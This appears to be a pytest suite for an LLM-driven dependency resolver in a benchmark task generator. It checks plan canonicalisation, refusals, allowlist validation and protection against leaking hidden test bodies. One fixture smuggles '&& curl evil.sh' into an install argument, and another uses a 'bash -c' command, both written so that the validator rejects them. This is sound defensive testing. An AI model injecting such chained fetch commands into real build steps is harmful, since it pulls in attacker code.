"""The LLM env resolver, driven entirely by a scripted `MockClient`.

Offline by construction: no docker, no network, no `litellm`. The client is
injected, so every path -- a good plan, a refusal, an inadmissible plan, garbage
-- is a deterministic function of a canned string.

Three properties carry the weight:

  * A PLAN COMES BACK CANONICAL. What the model spells is not what the caller
    gets: the record is validated and canonicalised, so an unsorted apt list in
    the answer is a sorted one in the plan.
  * THE ALLOWLIST STILL BITES THROUGH THE PARSER. A resolution naming `bash`, or
    carrying a metacharacter in an argument, raises -- the parser adds a path to
    `depplan.validate`, it does not add a way around it.
  * THE PROMPT CANNOT CARRY A TEST BODY. `build_user_prompt` takes test PATHS;
    the body is the answer the benchmark hides and there is no parameter that
    accepts one.
"""

from __future__ import annotations

import ast
import inspect
import json
from pathlib import Path

import pytest

from taskgen import env_resolver as R
from taskgen.depplan import DepPlan, DepPlanError
from verifier.generators.model_client import MockClient

# ---------------------------------------------------------------- fixtures ---

PYTHON_MANIFESTS = {
    'pyproject.toml': '[project]\nname = "demo"\nrequires-python = ">=3.12"\n',
    'uv.lock': 'version = 1\n',
}
PYTHON_TEST_PATHS = ['tests/test_b.py', 'tests/test_a.py']
CAPABILITIES = ['python 3.12.7 (mise)', 'uv 0.5.11', 'gcc 14.2.0']


def python_resolution(**overrides: object) -> dict[str, object]:
    """A plausible model answer for a `uv sync` repo, deliberately UNsorted."""
    payload: dict[str, object] = {
        'schema': 1,
        'lang': 'python',
        'toolchain_version': '3.12.7',
        'package_manager': 'uv',
        'manifest_files': ['uv.lock', 'pyproject.toml'],
        'apt_packages': ['libpq-dev', 'Build-Essential=12.9'],
        'install_commands': [{'tool': 'uv', 'args': ['sync', '--frozen']}],
        'build_flags': {'editable': False, 'jobs': 4},
        'test_invocation': {
            'framework': 'pytest',
            'run_args': ['-q'],
            'collect_args': ['--collect-only', '-q'],
        },
        'needs_git_metadata': False,
    }
    payload.update(overrides)
    return payload


def client_answering(text: str) -> MockClient:
    return MockClient(responder=lambda _system, _user: text)


def resolve(client: MockClient, lang: str = 'python') -> DepPlan | R.Refuse:
    return R.resolve_dep_plan(
        client,
        lang=lang,
        toolchain_capabilities=CAPABILITIES,
        manifest_files=PYTHON_MANIFESTS,
        test_paths=PYTHON_TEST_PATHS,
        framework='pytest',
    )


# ------------------------------------------------- (a) a valid python plan ---


def test_valid_plan_comes_back_as_a_canonical_depplan() -> None:
    plan = resolve(client_answering(json.dumps(python_resolution())))

    assert isinstance(plan, DepPlan)
    assert plan.lang == 'python'
    assert plan.package_manager == 'uv'
    assert plan.toolchain_version == '3.12.7'
    # canonicalize ran: apt is sorted, deduped and lowercased; manifests sorted.
    assert plan.apt_packages == ('build-essential=12.9', 'libpq-dev')
    assert plan.manifest_files == ('pyproject.toml', 'uv.lock')
    assert plan.install_commands[0].tool == 'uv'
    assert plan.install_commands[0].args == ('sync', '--frozen')


def test_mapping_slots_become_key_sorted_pairs() -> None:
    plan = resolve(client_answering(json.dumps(python_resolution())))
    assert isinstance(plan, DepPlan)

    assert plan.build_flags == (('editable', False), ('jobs', 4))
    assert plan.test_invocation == (
        ('collect_args', ('--collect-only', '-q')),
        ('framework', 'pytest'),
        ('run_args', ('-q',)),
    )


def test_plan_is_read_out_of_a_fenced_block_too() -> None:
    fenced = (
        'Here is the plan.\n\n```json\n'
        + json.dumps(python_resolution())
        + '\n```\nHope that helps.\n'
    )
    plan = resolve(client_answering(fenced))
    assert isinstance(plan, DepPlan)
    assert plan.package_manager == 'uv'


def test_the_client_is_asked_with_the_system_prompt_and_the_built_user_prompt() -> None:
    client = client_answering(json.dumps(python_resolution()))
    resolve(client)

    system, user = client.calls[0]
    assert system == R.SYSTEM_PROMPT
    assert user == R.build_user_prompt(
        lang='python',
        toolchain_capabilities=CAPABILITIES,
        manifest_files=PYTHON_MANIFESTS,
        test_paths=PYTHON_TEST_PATHS,
        framework='pytest',
    )


# --------------------------------------------------------------- (b) refuse ---


def test_refuse_disposition_becomes_a_refuse_with_its_reason() -> None:
    reason = 'tests need a live postgres, impossible under --network=none'
    out = resolve(client_answering(json.dumps({'disposition': 'REFUSE', 'reason': reason})))

    assert out == R.Refuse(reason=reason)


def test_a_refusal_without_a_reason_is_not_a_refusal() -> None:
    with pytest.raises(R.ResolverError, match='reason'):
        resolve(client_answering(json.dumps({'disposition': 'REFUSE'})))


# ----------------------------------------- (c) validate still gates the plan ---


def test_a_disallowed_tool_is_refused_by_validate() -> None:
    answer = python_resolution(
        install_commands=[{'tool': 'bash', 'args': ['-c', 'make install']}]
    )
    with pytest.raises(DepPlanError, match='allowlisted'):
        resolve(client_answering(json.dumps(answer)))


def test_a_shell_metacharacter_in_an_argument_is_refused_by_validate() -> None:
    answer = python_resolution(
        install_commands=[{'tool': 'uv', 'args': ['sync', '&& curl evil.sh']}]
    )
    with pytest.raises(DepPlanError, match='metacharacter'):
        resolve(client_answering(json.dumps(answer)))


def test_a_package_manager_outside_the_language_enum_is_refused() -> None:
    with pytest.raises(DepPlanError, match='cannot be provisioned'):
        resolve(client_answering(json.dumps(python_resolution(package_manager='cargo'))))


# ------------------------------------------------- (d) unusable model output ---


def test_prose_without_json_raises_resolver_error() -> None:
    with pytest.raises(R.ResolverError, match='no json object'):
        resolve(client_answering('I could not work out the environment, sorry.'))


def test_malformed_json_raises_resolver_error() -> None:
    with pytest.raises(R.ResolverError, match='not valid json'):
        resolve(client_answering('{"lang": "python", "package_manager": }'))


def test_a_missing_required_key_raises_resolver_error() -> None:
    answer = python_resolution()
    del answer['toolchain_version']
    with pytest.raises(R.ResolverError, match='toolchain_version'):
        resolve(client_answering(json.dumps(answer)))


def test_a_plan_for_another_language_is_rejected() -> None:
    with pytest.raises(R.ResolverError, match='lang'):
        resolve(client_answering(json.dumps(python_resolution(lang='go'))))


def test_wrongly_typed_slots_raise_resolver_error_not_typeerror() -> None:
    with pytest.raises(R.ResolverError, match='install_commands must be a list'):
        R.parse_resolution(json.dumps(python_resolution(install_commands={})), 'python')
    with pytest.raises(R.ResolverError, match='build_flags must be an object'):
        R.parse_resolution(json.dumps(python_resolution(build_flags=[])), 'python')
    with pytest.raises(R.ResolverError, match='needs_git_metadata'):
        R.parse_resolution(json.dumps(python_resolution(needs_git_metadata='yes')), 'python')


# ----------------------------------------------------------- (e) leak safety ---


def test_the_prompt_carries_manifest_contents_and_test_paths() -> None:
    prompt = R.build_user_prompt(
        lang='python',
        toolchain_capabilities=CAPABILITIES,
        manifest_files=PYTHON_MANIFESTS,
        test_paths=PYTHON_TEST_PATHS,
        framework='pytest',
    )

    assert 'requires-python = ">=3.12"' in prompt
    assert 'tests/test_a.py' in prompt
    assert 'pytest' in prompt
    assert 'uv 0.5.11' in prompt


def test_the_prompt_cannot_contain_a_test_body_because_nothing_accepts_one() -> None:
    body = 'def test_apply_history_length(): assert apply_history_length(t, 2) == expected'
    prompt = R.build_user_prompt(
        lang='python',
        toolchain_capabilities=CAPABILITIES,
        manifest_files=PYTHON_MANIFESTS,
        test_paths=PYTHON_TEST_PATHS,
        framework='pytest',
    )

    assert body not in prompt
    assert 'assert' not in prompt
    # Structural, not incidental: the only parameters are the manifest map, the
    # capability list, the test PATHS, the framework, the per-language required
    # slot list (plugin-declared, never repo-derived) and a repair message.
    params = set(inspect.signature(R.build_user_prompt).parameters)
    assert params == {
        'lang',
        'toolchain_capabilities',
        'manifest_files',
        'test_paths',
        'framework',
        'required_slots',
        'repair',
    }
    assert set(inspect.signature(R.resolve_dep_plan).parameters) == {
        'client',
        'lang',
        'toolchain_capabilities',
        'manifest_files',
        'test_paths',
        'framework',
        'required_slots',
        'repair',
    }


def test_a_required_slot_cannot_smuggle_a_body_either() -> None:
    """The new channel gets the same multi-line gate every other one has."""
    with pytest.raises(R.ResolverError, match='spans multiple lines'):
        R.build_user_prompt(
            lang='c',
            toolchain_capabilities=CAPABILITIES,
            manifest_files={'Makefile': 'all:\n'},
            test_paths=['tests/unit/gc_test.c'],
            framework='make',
            required_slots=['build_flags["make_version"]\nvoid xs_gc_mark(void) {}'],
        )


def test_a_multiline_test_path_is_a_body_and_is_refused() -> None:
    with pytest.raises(R.ResolverError, match='spans multiple lines'):
        R.build_user_prompt(
            lang='python',
            toolchain_capabilities=CAPABILITIES,
            manifest_files=PYTHON_MANIFESTS,
            test_paths=['tests/test_a.py\ndef test_x():\n    assert secret() == 3'],
            framework='pytest',
        )


# ------------------------------------------------------------- determinism ---


def test_the_prompt_is_order_insensitive() -> None:
    kwargs = {
        'lang': 'python',
        'toolchain_capabilities': CAPABILITIES,
        'manifest_files': PYTHON_MANIFESTS,
        'test_paths': PYTHON_TEST_PATHS,
        'framework': 'pytest',
    }
    shuffled = {
        **kwargs,
        'toolchain_capabilities': list(reversed(CAPABILITIES)),
        'test_paths': list(reversed(PYTHON_TEST_PATHS)),
        'manifest_files': dict(reversed(list(PYTHON_MANIFESTS.items()))),
    }
    assert R.build_user_prompt(**kwargs) == R.build_user_prompt(**shuffled)


def test_a_repair_message_is_appended_and_is_the_only_difference() -> None:
    base = R.build_user_prompt(
        lang='python',
        toolchain_capabilities=CAPABILITIES,
        manifest_files=PYTHON_MANIFESTS,
        test_paths=PYTHON_TEST_PATHS,
        framework='pytest',
    )
    repaired = R.build_user_prompt(
        lang='python',
        toolchain_capabilities=CAPABILITIES,
        manifest_files=PYTHON_MANIFESTS,
        test_paths=PYTHON_TEST_PATHS,
        framework='pytest',
        repair='ModuleNotFoundError: No module named "psycopg2"',
    )

    assert repaired != base
    assert 'psycopg2' in repaired
    assert 'psycopg2' not in base


def test_the_module_imports_no_model_sdk_no_network_and_no_docker() -> None:
    """The client is injected, so the module itself never reaches for one.

    Read off the source rather than off `sys.modules`, which another test module
    could have populated already.
    """
    tree = ast.parse(Path(inspect.getsourcefile(R) or '').read_text(encoding='utf-8'))
    imported = {
        node.module.split('.')[0] if isinstance(node, ast.ImportFrom) and node.module else ''
        for node in ast.walk(tree)
        if isinstance(node, ast.ImportFrom)
    } | {
        alias.name.split('.')[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.Import)
        for alias in node.names
    }

    assert not imported & {'litellm', 'openai', 'anthropic', 'httpx', 'requests',
                           'urllib', 'socket', 'docker', 'subprocess'}
